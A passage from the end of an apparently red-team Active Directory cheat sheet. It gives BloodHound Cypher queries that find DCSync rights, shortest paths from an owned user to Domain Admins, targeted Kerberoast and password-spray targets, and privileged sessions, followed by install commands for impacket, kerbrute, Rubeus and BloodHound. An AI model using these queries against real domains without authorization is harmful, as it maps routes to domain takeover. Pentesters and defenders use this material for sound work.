RETURN u.name, d.name

// Exclude Domain Admins (default)
MATCH (u:User)-[:GetChanges|GetChangesAll]->(d:Domain)
WHERE NOT (u)-[:MemberOf*1..]->(:Group {name: 'DOMAIN ADMINS@CORP.LOCAL'})
RETURN u.name, d.name
```

### Find Shortest Path to DA
```cypher
// Shortest path from owned user to Domain Admin
MATCH p=shortestPath((u:User {owned: true})-[*1..]->(g:Group {name: 'DOMAIN ADMINS@CORP.LOCAL'}))
RETURN p

// All paths from current user
MATCH (u:User {name: 'YOU@CORP.LOCAL'})
MATCH p=shortestPath((u)-[*1..]->(g:Group {name: 'DOMAIN ADMINS@CORP.LOCAL'}))
RETURN p
```

### Find Targeted Kerberoast Opportunities
```cypher
// Users where you have GenericAll/GenericWrite and they don't have SPN
MATCH (u:User)-[:GenericAll|GenericWrite]->(t:User)
WHERE t.hasspn = false
RETURN u.name, t.name
```

### Find Password Spray Targets
```cypher
// Users with pwdlastset > 90 days ago (likely stale passwords)
MATCH (u:User)
WHERE u.pwdlastset > 0 AND u.pwdlastset < (datetime().epochseconds - (90 * 86400))
RETURN u.name, datetime({epochSeconds: u.pwdlastset})
```

### Find Admin Sessions
```cypher
// High value targets with sessions
MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group {highvalue: true})
RETURN c.name, u.name, g.name

// Domain Admin sessions on non-DCs
MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group {name: 'DOMAIN ADMINS@CORP.LOCAL'})
WHERE NOT (c)-[:MemberOf*1..]->(:Group {name: 'DOMAIN CONTROLLERS@CORP.LOCAL'})
RETURN c.name, u.name
```

---

## Tools Installation

```bash
# impacket
pip install impacket

# kerbrute
go install github.com/ropnop/kerbrute@latest

# Rubeus (compile on Windows)
git clone https://github.com/GhostPack/Rubeus
cd Rubeus
# Open in Visual Studio and build

# BloodHound
pip install bloodhound
```

---

*Last updated: 2026-02-25 (v2.0 - Corrected & Enriched)*
